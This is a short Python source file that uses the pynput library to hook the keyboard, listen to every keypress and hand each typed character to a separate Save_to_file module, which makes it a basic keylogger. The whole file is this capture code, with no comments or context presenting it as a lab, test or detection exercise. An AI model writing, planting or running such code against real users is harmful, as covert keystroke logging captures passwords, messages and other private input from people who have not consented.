from pynput import keyboard
import Save_to_file


def key_press(key):
    if hasattr(key, 'char'):
        Save_to_file.save_to_file(key.char)


def hook_keyboard():
    with keyboard.Listener(on_press=key_press) as listener:
        listener.join()
    print(listener)

